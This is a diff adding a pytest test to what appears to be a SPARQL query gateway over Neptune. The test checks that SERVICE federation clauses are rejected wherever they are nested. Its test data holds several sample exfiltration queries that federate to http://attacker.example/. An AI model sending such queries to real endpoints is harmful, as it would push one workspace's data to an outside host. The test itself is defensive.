@@ -92,6 +92,47 @@ def test_escape_routes_are_rejected(client, auth_headers, mock_neptune, query):
     mock_neptune.query.assert_not_called()
 
 
+@pytest.mark.parametrize(
+    ("label", "pattern"),
+    [
+        ("top level", "SERVICE <http://attacker.example/> { ?s ?p ?o }"),
+        (
+            "in OPTIONAL",
+            "?s ?p ?o OPTIONAL { SERVICE <http://attacker.example/> { ?a ?b ?c } }",
+        ),
+        (
+            "in UNION",
+            "{ ?s ?p ?o } UNION { SERVICE <http://attacker.example/> { ?a ?b ?c } }",
+        ),
+        (
+            "in a subselect",
+            "{ SELECT ?a WHERE { SERVICE <http://attacker.example/> { ?a ?b ?c } } }",
+        ),
+        (
+            "three levels down",
+            "?s ?p ?o OPTIONAL { { ?x ?y ?z } UNION "
+            "{ GRAPH ?g { SERVICE <http://attacker.example/> { ?a ?b ?c } } } }",
+        ),
+        ("SILENT", "SERVICE SILENT <http://attacker.example/> { ?s ?p ?o }"),
+        (
+            "variable endpoint",
+            "VALUES ?e { <http://attacker.example/> } SERVICE ?e { ?s ?p ?o }",
+        ),
+    ],
+)
+def test_service_is_rejected_at_any_nesting_depth(
+    client, auth_headers, mock_neptune, label, pattern
+):
+    """Federation would push this workspace's rows to an endpoint of the
+    caller's choosing, so a SERVICE buried in a subselect must be caught as
+    surely as one at the top level."""
+    res = _post_query(
+        client, auth_headers, f"SELECT * FROM <{OWN_GRAPH}> WHERE {{ {pattern} }}"
+    )
+    assert res.status_code == 400, f"{label}: {res.text}"
+    mock_neptune.query.assert_not_called()
+
+
 def test_from_hidden_in_a_string_literal_does_not_satisfy_the_gate(
     client, auth_headers, mock_neptune
 ):
